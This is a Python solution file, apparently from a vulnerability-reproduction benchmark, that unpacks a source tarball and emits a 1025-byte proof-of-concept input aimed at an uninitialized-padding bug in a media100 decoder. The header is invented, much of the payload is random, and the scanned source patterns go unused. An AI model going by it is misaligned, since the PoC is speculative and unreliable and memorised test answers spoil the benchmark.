import os
import tarfile
import tempfile
import subprocess
import hashlib
import struct
import io
import random
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find the relevant source files
            source_files = []
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith(('.c', '.cpp', '.cc', '.h', '.hpp')):
                        source_files.append(os.path.join(root, file))
            
            # Look for buffer-related code patterns
            buffer_patterns = []
            for file in source_files:
                try:
                    with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        # Look for patterns indicating buffer operations
                        if 'padding' in content.lower() or 'uninitialized' in content.lower():
                            # Try to find buffer size hints
                            lines = content.split('\n')
                            for i, line in enumerate(lines):
                                if '1024' in line or '1025' in line or '2048' in line:
                                    buffer_patterns.append((file, i, line))
                except:
                    continue
            
            # Generate PoC based on typical media100 format patterns
            # The vulnerability is in output buffer padding, so we need to create
            # input that causes the code to allocate an output buffer with padding
            # that doesn't get cleared
            
            # Start with a minimal valid header pattern
            poc = bytearray()
            
            # Common pattern for media/video files: some header followed by data
            # We'll create a structure that's likely to trigger the buffer allocation
            
            # Add a simple header (4 bytes magic)
            poc.extend(b'M100')
            
            # Add version/flags (4 bytes)
            poc.extend(struct.pack('<I', 0x00010000))
            
            # Frame count (4 bytes) - trigger multiple frames to allocate buffers
            poc.extend(struct.pack('<I', 10))
            
            # Width and height (8 bytes total)
            poc.extend(struct.pack('<I', 1920))  # width
            poc.extend(struct.pack('<I', 1080))  # height
            
            # Now add frame data that would cause padding in output buffer
            # The key is to have data that doesn't align perfectly with buffer boundaries
            
            # Calculate remaining bytes to reach target length of 1025
            current_len = len(poc)
            remaining = 1025 - current_len
            
            # Add data that's not aligned to typical block sizes
            # This can trigger padding in output buffers
            
            # Add pattern that alternates to create specific memory patterns
            pattern = bytearray()
            
            # Use a pattern that might trigger specific code paths
            # including values that could be interpreted as special flags
            for i in range(remaining):
                # Alternating pattern to avoid simple compression/optimization
                if i % 3 == 0:
                    pattern.append(0xFF)
                elif i % 3 == 1:
                    pattern.append(0x00)
                else:
                    pattern.append(random.randint(1, 254))
            
            poc.extend(pattern)
            
            # Ensure exact length of 1025 bytes
            poc = poc[:1025]
            if len(poc) < 1025:
                poc.extend(b'\x00' * (1025 - len(poc)))
            
            # Try to validate that this might trigger the vulnerability
            # by checking if it has characteristics that could cause buffer issues
            
            # The PoC should have:
            # 1. A valid-enough header to pass initial parsing
            # 2. Data that causes output buffer allocation with padding
            # 3. Non-zero data in padding areas that might be read uninitialized
            
            return bytes(poc)